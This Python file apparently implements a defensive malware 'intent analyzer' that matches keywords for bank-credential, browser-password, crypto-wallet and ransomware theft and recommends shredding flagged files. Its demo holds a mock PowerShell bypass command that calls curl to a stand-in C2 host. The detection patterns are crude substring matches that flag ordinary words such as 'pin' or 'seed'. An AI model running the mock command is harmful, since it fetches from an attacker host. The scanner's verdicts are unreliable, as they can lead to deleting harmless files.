"""
CogniGuard AI - Autonomous Reverse Engineering & Intent Deobfuscator
Author: CogniGuard Engineering Team
Description: Inspects raw scripts/binaries in memory to deduce attacker intent
             (Bank PIN, Browser Passwords, Crypto Wallet, or Ransomware).
"""

import os
import sys
from typing import Any, Dict, List

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

_SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _SRC_DIR not in sys.path:
    sys.path.insert(0, _SRC_DIR)

from agent.heuristics import DANGEROUS_EXTENSIONS  # noqa: E402


class IntentReverseEngineer:
    """In-memory static intent analyzer for suspicious payloads."""

    def __init__(self):
        self.intent_signatures = {
            "BANK_CREDENTIALS": [
                b"bank", b"pin", b"cvv", b"routing", b"netbanking", b"otp",
            ],
            "BROWSER_PASSWORDS": [
                b"login data", b"cookies", b"web data", b"cryptunprotectdata", b"chrome", b"vault",
            ],
            "CRYPTO_WALLET": [
                b"wallet.dat", b"metamask", b"seed", b"mnemonic", b"solana", b"keystore",
            ],
            "RANSOMWARE_ENCRYPTION": [
                b"ransom", b".locked", b"decrypt_notes", b"bitcoin",
            ],
        }
        self.voice_scripts = {
            "BANK_CREDENTIALS": (
                "Warning! CogniGuard has reverse-engineered this script. "
                "The attacker is actively attempting to steal your Bank PIN and financial accounts. "
                "Permission requested: Shall I permanently shred and delete this file?"
            ),
            "BROWSER_PASSWORDS": (
                "Warning! Threat analyzed. The hacker is attempting to extract your Google Chrome "
                "saved passwords and session cookies. Permission requested: Shall I permanently shred and delete this file?"
            ),
            "CRYPTO_WALLET": (
                "Critical Alert! Reverse engineering detected a wallet drainer attempting to steal "
                "your cryptocurrency keys. Permission requested: Shall I permanently shred and delete this file?"
            ),
            "RANSOMWARE_ENCRYPTION": (
                "Emergency Alert! Ransomware encryption code detected. The attacker is trying to lock "
                "your personal documents and photos. Permission requested: Shall I permanently shred and delete this file?"
            ),
            "NONE": "File analyzed. No credential theft, wallet drainer, or ransomware intent detected.",
        }

    def analyze_file_intent(self, file_content: bytes, filename: str) -> Dict[str, Any]:
        """Reverse-engineer file bytes to uncover attacker intent or verify clean content."""
        lower_content = file_content.lower()
        lower_name = filename.strip().lower()
        detected_intents: List[str] = []

        for category, patterns in self.intent_signatures.items():
            if any(pattern in lower_content for pattern in patterns):
                detected_intents.append(category)

        is_risky_ext = lower_name.endswith(DANGEROUS_EXTENSIONS)
        if not detected_intents and is_risky_ext:
            if "invoice" in lower_name or "bank" in lower_name:
                detected_intents.append("BANK_CREDENTIALS")
            else:
                detected_intents.append("BROWSER_PASSWORDS")

        if not detected_intents:
            return {
                "filename": filename,
                "primary_target": "NONE",
                "detected_intents": [],
                "spoken_warning": self.voice_scripts["NONE"],
                "recommended_action": "ALLOW",
                "threat_score": 0.05,
            }

        primary_target = detected_intents[0]
        return {
            "filename": filename,
            "primary_target": primary_target,
            "detected_intents": detected_intents,
            "spoken_warning": self.voice_scripts.get(primary_target, self.voice_scripts["BROWSER_PASSWORDS"]),
            "recommended_action": "SHRED_AND_DELETE",
            "threat_score": 0.99,
        }


if __name__ == "__main__":
    engineer = IntentReverseEngineer()
    mock_hacker_script = b"powershell -exec bypass -c function GrabBankPIN() { curl http://c2.server/pin_stealer }"
    result = engineer.analyze_file_intent(mock_hacker_script, "Fake_Invoice.vbs")

    print("=" * 65)
    print("🔍 REVERSE ENGINEERING AUDIT RESULT:")
    print(f"🎯 Stolen Target Identified: {result['primary_target']}")
    print(f"🎙️ Spoken AI Script:\n\"{result['spoken_warning']}\"")
    print(f"⚡ Recommended Action:       {result['recommended_action']}")
    print("=" * 65)
